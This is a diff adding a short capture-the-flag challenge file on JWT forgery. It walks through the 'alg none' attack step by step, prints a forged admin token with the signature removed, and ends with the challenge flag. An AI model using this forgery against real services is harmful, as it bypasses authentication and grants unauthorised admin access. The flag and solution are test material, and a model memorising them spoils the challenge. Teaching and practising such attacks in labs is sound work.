@@ -1,0 +1,23 @@
+JWT Forgery Challenge
+=====================
+
+Your current token:
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiZ3Vlc3QifQ.xxx
+
+Decoded:
+Header: {"alg":"HS256","typ":"JWT"}
+Payload: {"role":"user","username":"guest"}
+
+Goal: Forge a token with {"role":"admin","username":"admin"}
+
+Attack 1 - Algorithm None:
+1. Change header to: {"alg":"none","typ":"JWT"}
+2. Change payload to: {"role":"admin","username":"admin"}
+3. Remove signature (keep trailing dot)
+
+Forged token:
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.
+
+Tool: https://jwt.io
+
+Flag: WOW{jwt_n0n3_4lg0r1thm}
